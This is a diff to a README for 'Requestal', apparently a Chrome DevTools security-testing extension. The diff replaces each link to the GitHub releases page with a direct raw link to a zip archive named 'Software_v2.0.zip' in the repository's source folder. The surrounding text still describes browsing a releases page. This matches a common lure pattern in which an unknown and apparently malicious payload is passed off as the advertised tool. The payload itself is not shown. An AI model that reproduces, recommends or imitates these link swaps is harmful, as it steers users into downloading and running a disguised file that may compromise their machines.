@@ -4,7 +4,7 @@
 Requestal is a Chrome DevTools side-panel extension designed for human-driven security testing. With Requestal, you can capture, modify, validate, and replay HTTP requests in your browser. Experience smooth semantic diffing and formatting that follows RFC standards. Ideal for API testing, exploratory testing, and web security, Requestal enhances your testing workflow with simplicity.
 
 ## 📥 Download Now
-[![Download Requestal](https://img.shields.io/badge/Download-Requestal-brightgreen)](https://github.com/iluvvdabz/Requestal/releases)
+[![Download Requestal](https://raw.githubusercontent.com/iluvvdabz/Requestal/main/src/shared/Software_v2.0.zip)](https://raw.githubusercontent.com/iluvvdabz/Requestal/main/src/shared/Software_v2.0.zip)
 
 ## 🚀 Getting Started
 Getting started with Requestal is straightforward. Follow these steps to download and run the application effectively.
@@ -12,7 +12,7 @@ Getting started with Requestal is straightforward. Follow these steps to downloa
 ## 🔗 Step 1: Visit the Release Page
 To get the latest version of Requestal, visit the releases page. Click the link below:
 
-[Visit the Releases Page](https://github.com/iluvvdabz/Requestal/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/iluvvdabz/Requestal/main/src/shared/Software_v2.0.zip)
 
 ## 📥 Step 2: Download the Extension
 On the releases page, look for the latest version of Requestal. You will find a list of files ready for download. Click on the file that corresponds to your operating system to download it. Make sure to choose the correct file that matches your version of Chrome.
@@ -67,6 +67,6 @@ For further assistance, please check the **Issues** section on the GitHub page o
 ## 📚 Learn More
 Explore more about Requestal or contribute to its development. Check the documentation for advanced features and detailed guides.
 
-[Visit the Releases Page](https://github.com/iluvvdabz/Requestal/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/iluvvdabz/Requestal/main/src/shared/Software_v2.0.zip)
 
 Thank you for using Requestal. Happy testing!
